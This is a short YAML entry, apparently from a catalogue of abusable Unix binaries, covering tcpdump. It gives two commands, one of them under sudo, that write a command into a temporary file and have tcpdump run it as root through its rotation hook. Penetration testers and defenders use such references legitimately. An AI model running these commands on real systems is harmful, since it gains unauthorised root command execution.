---
functions:
  execute-non-interactive:
    - code: echo "whoami > /tmp/whoami" > /tmp/tmpfile
            tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root
  sudo-enabled:
    - code: echo "whoami > /tmp/whoami" > /tmp/tmpfile
            sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root
---
